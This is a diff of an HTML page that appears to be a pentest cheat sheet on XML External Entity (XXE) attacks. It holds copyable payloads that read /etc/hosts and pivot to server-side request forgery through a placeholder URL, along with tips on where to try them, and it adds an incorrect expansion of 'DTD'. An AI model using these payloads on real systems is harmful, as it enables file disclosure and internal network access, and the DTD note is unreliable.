@@ -36,6 +36,8 @@
 	
 1. Important to inspect the requests/responses, if XML code is present there's a chance to attempt XXE.
 2. Each time you find a site to upload files and the .xml extention is allowed, XXE attempts are needed. 
+3. DTD means, data definition type.
+4. 
 
 </details>
 <details>
@@ -44,12 +46,12 @@
 
 <b><u>SAMPLE:</u></b>
 
-<b>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE attempt [ &lt;!ENTITY CUMBIA SYSTEM "file:///etc/hosts"&gt; ]&gt;
-&lt;Check&gt;
+<i>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</i>
+<b>&lt;!DOCTYPE attempt [ &lt;!ENTITY CUMBIA SYSTEM "file:///etc/hosts"&gt;]&gt;</b>
+<i>&lt;Check&gt;
 &lt;Id&gt;&CUMBIA;&lt;/Id&gt;
 &lt;productId&gt;1&lt;/productId&gt;
-&lt;/Check&gt;</b>
+&lt;/Check&gt;</i>
 
 <b>GET DATA: </b><mark id="XXE01">&lt;!DOCTYPE attempt [ &lt;!ENTITY VAR_NAME SYSTEM "file:///etc/hosts"&gt; ]&gt; </mark>
 
@@ -68,12 +70,12 @@ Modify the name as you want.
 </details>
 <details>
 <summary>CROSS ATTACKS</summary>
-<b> > XXE to SSRF</b>
+<b>:::> XXE to SSRF</b>
 
 There's one simple attempt that can be executed, for this case scenario a vuln_server will be needed to exploit this. This attack can 
 be considered "external entities" attack. Same payload and technique can be used to exploit this. 
 
-<b>GET DATA: </b><mark id="XXE10">&lt;!DOCTYPE attempt [ &lt;!ENTITY VAR_NAME SYSTEM "http://IP/DOMAIN"&gt; ]&gt;</mark>
+<b>GET DATA: </b><mark id="XXE10">&lt;!DOCTYPE attempt [ &lt;!ENTITY VAR_NAME SYSTEM "http://IP_ADDR/URI_PATH"&gt; ]&gt;</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#XXE10')">.C1.</button>
 
@@ -83,9 +85,10 @@ see if others paths provide more information.
 </details>
 <details>
 <summary>BLIND TECHNIQUES</summary>
-<b> > VIA ERROR MESSAGES </b>
+<b>:::> VIA ERROR MESSAGES </b>
 
 
+	
 </details>
 </div>
 </pre>
